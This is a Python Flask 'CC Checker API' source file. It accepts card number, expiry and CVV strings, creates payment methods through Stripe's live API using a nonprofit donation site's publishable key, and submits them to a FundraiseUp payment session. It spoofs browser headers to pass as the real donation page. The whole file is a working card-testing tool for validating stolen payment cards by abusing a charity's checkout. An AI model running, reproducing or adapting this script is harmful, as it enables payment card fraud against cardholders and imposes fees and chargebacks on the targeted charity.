from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

@app.route('/')
def index():
    return "CC Checker API is Running"

@app.route('/chk')
def check_card():
    lista = request.args.get('lista', '')
    
    # Parse different card format inputs
    if '|' in lista:
        parts = lista.split('|')
    elif '/' in lista:
        # Handle ccn|mm/yy format
        if '|' in lista:
            main_parts = lista.split('|')
            if '/' in main_parts[1]:
                date_parts = main_parts[1].split('/')
                parts = [main_parts[0], date_parts[0], date_parts[1], main_parts[2]]
            else:
                parts = main_parts
        else:
            parts = lista.split('/')
    else:
        return jsonify({"error": "Invalid format. Use: ccn|mm|yy|cvv or ccn|mm/yy|cvv"})
    
    if len(parts) < 4:
        return jsonify({"error": "Invalid format. Need: card|month|year|cvv"})
    
    card_number = parts[0].strip()
    month = parts[1].strip()
    year = parts[2].strip()
    cvv = parts[3].strip()
    
    # Handle 2-digit vs 4-digit year
    if len(year) == 2:
        year = '20' + year
    
    # Format month to 2 digits
    if len(month) == 1:
        month = '0' + month
    
    try:
        # First request to Stripe
        headers1 = {
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6,bn;q=0.5,nl;q=0.4,de;q=0.3',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }

        data1 = f'type=card&card[number]={card_number}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}&guid=bc53e3de-0b0a-4395-ab12-25848af0dbf3ff4c83&muid=4a33b46e-7ed4-4ea0-aae5-9151aa2d25bd2420f7&sid=01d67f24-5f46-4056-8762-c4eadb1f213e68c0cd&payment_user_agent=stripe.js%2F851131afa1%3B+stripe-js-v3%2F851131afa1%3B+split-card-element&referrer=https%3A%2F%2Fwww.pushbuffalo.org&time_on_page=77491&client_attribution_metadata[client_session_id]=149e617d-3da4-4c3a-8eb4-9fe97acd0a96&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_9RzCojmneCvL31GhYTknluXp&_stripe_account=acct_1EQGX0Ks04gcv5mY&_stripe_version=2025-02-24.acacia'

        response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1)
        stripe_response = response1.json()
        
        if 'id' not in stripe_response:
            return jsonify({
                "card": f"{card_number}|{month}|{year}|{cvv}",
                "status": "Declined",
                "response": stripe_response
            })
        
        pid = stripe_response["id"]

        # Second request to FundraiseUp
        headers2 = {
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6,bn;q=0.5,nl;q=0.4,de;q=0.3',
            'content-type': 'text/plain; charset=utf-8',
            'origin': 'https://www.pushbuffalo.org',
            'priority': 'u=1, i',
            'referer': 'https://www.pushbuffalo.org/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-storage-access': 'active',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-fru-embed-version': '251114-1326',
        }

        data2 = f'{{"paymentMethod":{{"id":"{pid}","object":"payment_method","allow_redisplay":"unspecified","billing_details":{{"address":{{"city":null,"country":null,"line1":null,"line2":null,"postal_code":null,"state":null}},"email":null,"name":null,"phone":null,"tax_id":null}},"card":{{"brand":"visa","brand_product":null,"checks":{{"address_line1_check":null,"address_postal_code_check":null,"cvc_check":null}},"country":"US","display_brand":"visa","exp_month":{month},"exp_year":{year},"funding":"debit","generated_from":null,"last4":"{card_number[-4:]}","networks":{{"available":["visa"],"preferred":null}},"regulated_status":"unregulated","three_d_secure_usage":{{"supported":true}},"wallet":null}},"created":1763132239,"customer":null,"livemode":true,"radar_options":{{}},"type":"card"}}}}'

        response2 = requests.post('https://api.fundraiseup.com/paymentSession/7224428805057036011/pay', headers=headers2, data=data2)
        
        return jsonify({
            "card": f"{card_number}|{month}|{year}|{cvv}",
            "status": "Processed",
            "stripe_response": stripe_response,
            "fundraiseup_response": response2.text
        })

    except Exception as e:
        return jsonify({
            "card": f"{card_number}|{month}|{year}|{cvv}",
            "status": "Error",
            "error": str(e)
        })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
